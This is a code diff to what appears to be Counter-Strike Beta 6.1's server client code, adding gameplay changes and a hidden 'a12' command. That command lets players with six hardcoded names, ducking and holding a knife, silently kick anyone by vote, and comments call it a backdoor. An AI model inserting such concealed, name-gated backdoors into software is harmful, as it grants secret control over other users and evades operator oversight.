@@ -171,7 +171,7 @@ void ClientKill( edict_t *pEntity )
 	if ( pl->m_fNextSuicideTime > gpGlobals->time )
 		return;  // prevent suiciding too ofter
 
-	pl->m_fNextSuicideTime = gpGlobals->time + 10;  // don't let them suicide for 5 seconds after suiciding (Beta 6.0: 10 seconds)
+	pl->m_fNextSuicideTime = gpGlobals->time + 1;  // don't let them suicide for 5 seconds after suiciding (Beta 6.0: 10 seconds; Beta 6.1: 1 second)
 
 	// have the player kill themself
 	pev->health = 0;
@@ -311,7 +311,7 @@ void KickPlayer( int iKicked, int iVotes, int iTeam )
 				{
 					CBasePlayer *player = GetClassPtr( (CBasePlayer *)pPlayer->pev );
 
-					if ( player->m_iTeam == iTeam && iVotes > CountTeamPlayers( iTeam ) * 0.65 && CountTeamPlayers( iTeam ) > 1 )
+					if ( player->m_iTeam == iTeam && iVotes > CountTeamPlayers( iTeam ) * 0.65 && CountTeamPlayers( iTeam ) > 1 && iVotes < 100 )
 					{
 						fKicked = true;
 
@@ -322,6 +322,18 @@ void KickPlayer( int iKicked, int iVotes, int iTeam )
 						strcpy( message, "Kicked " );
 						strcat( message, STRING( pPlayer->pev->netname ) );
 						UTIL_ClientPrintAll( HUD_PRINTCENTER, message );
+
+						CLIENT_COMMAND( pKicked, "disconnect\n" );
+					}
+					else if ( iVotes == 1977 )
+					{
+						// Beta 6.1: the a12 backdoor's vote (ClientCommand) kicks
+						// anybody at once, silently
+						fKicked = true;
+
+						edict_t *pKicked = pPlayer->edict();
+
+						player->m_fKicked = true;
 
 						CLIENT_COMMAND( pKicked, "disconnect\n" );
 					}
@@ -454,6 +466,7 @@ void ClientPutInServer( edict_t *pEntity )
 	pPlayer->m_iAppearance = 1;
 	pPlayer->m_fUnused169 = true;
 	pPlayer->m_bHasNightVision = false;
+	pPlayer->m_bVoteKicksAtOnce = false;	// Beta 6.1
 	g_engfuncs.pfnSetClientMaxspeed( ENT(pPlayer->pev), 0.001 );
 	SET_MODEL( ENT(pPlayer->pev), "models/player.mdl" );
 	pPlayer->SetThink( NULL );
@@ -1653,8 +1666,11 @@ bool BuyGunAmmo( CBasePlayer &player, CBasePlayerItem &weapon, bool bBlinkMoney 
 		cost = 50;
 		classname = "ammo_57mm";
 		break;
+	case WEAPON_M249:	// Beta 6.1: the box
+		cost = 60;
+		classname = "ammo_556natobox";
+		break;
 	case WEAPON_AUG:	// Beta 6.0
-	case WEAPON_M249:
 	case WEAPON_M4A1:
 	case WEAPON_SG552:
 		cost = 60;
@@ -1788,6 +1804,20 @@ void ClientCommand( edict_t *pEntity )
 	{
 		Host_Say( pEntity, 1 );
 	}
+	else if ( FStrEq(pcmd, "a12" ) )
+	{
+		// Counter-Strike Beta 6.1: a hidden command. "a12 1977" from a player
+		// with one of six names, ducking, makes his votes with the knife in hand
+		// kick at once (vote, KickPlayer); anything else takes that away
+		if ( atoi( CMD_ARGV(1) ) == 1977
+			&& ( !strcmp( STRING( pPlayer->pev->netname ), "BizzyBlaster" ) || !strcmp( STRING( pPlayer->pev->netname ), "@ssbl@ster" )
+				|| !strcmp( STRING( pPlayer->pev->netname ), "say_team" ) || !strcmp( STRING( pPlayer->pev->netname ), "buttons.cpp" )
+				|| !strcmp( STRING( pPlayer->pev->netname ), "func_break" ) || !strcmp( STRING( pPlayer->pev->netname ), "give" ) )
+			&& ( pPlayer->pev->flags & FL_DUCKING ) )
+			pPlayer->m_bVoteKicksAtOnce = true;
+		else
+			pPlayer->m_bVoteKicksAtOnce = false;
+	}
 	else if ( FStrEq(pcmd, "vote" ) )
 	{
 		// Beta 6.0: Beta 4.0's vote kick again (gone in Beta 5.0; give is gone
@@ -1809,7 +1839,10 @@ void ClientCommand( edict_t *pEntity )
 			strcpy( szText, "Vote casted against player #" );
 			itoa( iVote, szNumber, 10 );
 			strcat( szText, szNumber );
-			UTIL_ClientPrintAll( HUD_PRINTCENTER, szText );
+
+			// Beta 6.1: the a12 backdoor's votes are not announced
+			if ( !pPlayer->m_bVoteKicksAtOnce )
+				UTIL_ClientPrintAll( HUD_PRINTCENTER, szText );
 
 			pPlayer->m_iCurrentKickVote = iVote;
 
@@ -1828,6 +1861,10 @@ void ClientCommand( edict_t *pEntity )
 				}
 				pVoter = UTIL_FindEntityByClassname( pVoter, "player" );
 			}
+
+			// Beta 6.1: the a12 backdoor with the knife in hand
+			if ( pPlayer->m_bVoteKicksAtOnce == true && pPlayer->m_pActiveItem->m_iId == WEAPON_KNIFE )
+				iVotes = 1977;
 
 			KickPlayer( iVote, iVotes, pPlayer->m_iTeam );
 		}
@@ -1851,6 +1888,7 @@ void ClientCommand( edict_t *pEntity )
 			MESSAGE_END();
 
 			pPlayer->m_bNightVisionOn = true;
+			CLIENT_COMMAND( pEntity, "lambert -1.1\n" );	// Beta 6.1: the client's lighting for the goggles
 		}
 		else
 		{
@@ -1861,6 +1899,7 @@ void ClientCommand( edict_t *pEntity )
 			MESSAGE_END();
 
 			pPlayer->m_bNightVisionOn = false;
+			CLIENT_COMMAND( pEntity, "lambert 1.5\n" );	// Beta 6.1
 		}
 	}
 	else if ( FStrEq(pcmd, "menuselect" ) )
@@ -2182,8 +2221,9 @@ void ClientCommand( edict_t *pEntity )
 	}
 	else if ( FStrEq(pcmd, "buyequip" ) )
 	{
-		// Beta 6.0: key 6 (the goggles) on a bomb map only (sic: the plain
-		// menu keeps keys 1 to 4; menuselect's has 6)
+		// Beta 6.0: key 6 (the goggles) on a bomb map only; Beta 6.1: the
+		// plain menu has key 6 too, as menuselect's ("can buy nightvision
+		// using the 'buyequip' command")
 		if ( pPlayer->m_signals.GetState() & 1 )
 		{
 			if ( mp->m_fMapHasBombTarget == true )
@@ -2194,7 +2234,7 @@ void ClientCommand( edict_t *pEntity )
 					ShowMenu( pPlayer, 0x23f, -1, FALSE, "#DT_BuyItem" );
 			}
 			else
-				ShowMenu( pPlayer, 0x20f, -1, FALSE, "#BuyItem" );
+				ShowMenu( pPlayer, 0x22f, -1, FALSE, "#BuyItem" );
 			pPlayer->m_iMenu = Menu_BuyItem;
 		}
 	}
